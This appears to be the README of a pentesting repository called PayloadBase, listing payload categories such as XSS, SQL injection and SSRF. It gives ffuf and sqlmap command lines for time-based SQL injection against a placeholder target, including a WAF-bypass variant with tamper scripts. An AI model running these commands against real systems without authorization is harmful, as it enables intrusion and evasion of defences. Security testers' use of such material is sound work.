# PayloadBase

PayloadBase is a curated collection of offensive payloads designed for fuzzing, exploitation, and vulnerability research.

## Categories

- XSS
- SQL Injection
- SSRF
- LFI / RFI
- Command Injection
- API / JSON
- Polyglot Payloads
- Mutation Payloads

## Usage

Use with tools like:
- ffuf
- Burp Suite
- wfuzz
- sqlmap

Example:
```
ffuf -u https://target.com/FUZZ -w xss/basic.txt
```

```
#HTTP GET
sqlmap -u "https://target.com/page?id=1" \
  --technique=T \
  --time-sec=10 \
  --level=3 \
  --risk=1 \
  --payload-file=sqlmap_timebased_final.xml

#HTTP POST
sqlmap -r /tmp/target.txt \
  --technique=T \
  --time-sec=10 \
  --level=3 \
  --risk=1 \
  --payload-file=sqlmap_timebased_final.xml

#HTTP Header
sqlmap -u "https://target.com/page" \
  --technique=T \
  --time-sec=10 \
  --level=5 \
  --risk=3 \
  -p "User-Agent" \
  --payload-file=sqlmap_timebased_final.xml \
  --random-agent

#WAF Bypass
sqlmap -u "https://target.com/page?id=1" \
  --technique=T \
  --time-sec=10 \
  --payload-file=sqlmap_timebased_final.xml \
  --tamper=space2comment,between,randomcase
```

## هدف

Provide high-quality, real-world payloads beyond basic wordlists.

---

⚠️ This repository is for educational and authorized security testing only.
